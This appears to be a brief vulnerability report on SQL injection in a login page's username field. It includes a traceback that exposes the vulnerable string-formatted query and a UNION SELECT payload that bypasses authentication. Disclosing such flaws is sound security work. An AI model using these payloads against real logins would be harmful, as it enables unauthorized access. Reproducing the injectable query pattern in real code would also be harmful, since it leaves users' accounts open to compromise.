
## Title
> SQLi in username field.

## Description
> In the "login" page, Username has SQL Injection vulnerability.

## Reproduction Steps
1. Go to login page /login
2. Username: admin'--
3. Password: password1
4. Press Log In button
5. --> Error you see
```
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")
```
6. Username: admin' UNION SELECT "password1" as password FROM admins where ' '=' ';--
7. Password: password1
8. Press Log In button!